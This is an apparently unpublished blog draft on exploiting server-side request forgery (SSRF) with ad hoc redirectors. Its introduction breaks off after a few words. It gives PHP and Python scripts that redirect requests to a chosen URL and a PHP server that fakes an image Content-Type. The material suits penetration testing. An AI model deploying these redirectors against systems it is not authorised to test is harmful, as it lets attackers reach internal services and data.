---
layout: post
title: Exploiting SSRFs using On-the-Fly Redirectors 
published: false
---

It can be extremely useful to 

---

# PHP
Run the following scripts using PHP's built-in development:
```
php -S 0.0.0.0:8080 redirector.php
```

### Simple Redirector
The following script will forward all requests to the value of the hardcoded variable `destination`:
```php
<?php
$destination = 'https://example.com';

# print IP address and requested URI
error_log(print_r("- ".$_SERVER['REMOTE_ADDR']." - ".$_SERVER["REQUEST_URI"], true));

# forward to target destination
Header("Location: ".$destination);
?>
```

### Advanced Redirector
Here is a slightly more advanced variation of the above script. If a requested URI contains the extension `.png` *and* the query parameter `url`, this script will forward the request to the URL-decoded value of the parameter `url`. It also includes a commented-out option to use base64 instead.

If you can control the full URL, this redirector will make testing easier as you won't need to edit the PHP file every time you want a request to be forwarded to a different destination - you can, for instance, just change the value of the URL in Burp's Repeater.
```php
<?php
$extension = 'png';

# print IP address and requested URI
error_log(print_r("- ".$_SERVER['REMOTE_ADDR']." - ".$_SERVER["REQUEST_URI"], true));

if ((preg_match("/\.(?:$extension)/", $_SERVER["REQUEST_URI"])) && $_GET['url']) {
    # get parameter 'url' and assign to variable 'location'
    $location = $_GET['url'];
    # forward request to URL-decoded variable
    Header("Location: ".urldecode($location));
    //Header("Location: ".base64_decode($location));
} else {
    # if the request does not match above criteria, print "OK"
    echo "OK";
}
?>
```

### Image Server
Some applications mishandle external images and may only check the value of the header `Content-Type` in order to determine if an external image file is safe to download onto their own server.

```php
<?php
$target_file = "example.jpg";

Header("Content-Type: image/jpg");
//Header("Content-Type: image/png");

$file=@$target_file;
$size=filesize($file);

Header("Content-Length: $size bytes");

# serve file
readfile($file);

?>
```

# Python
Python redirector:
```python
#!/usr/bin/env python3
# redirector.py

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("""
Usage: {} <port_number> <url>
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(301)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()

```

Run it:
```
python3 redirector.py 8080 "https://example.com"
```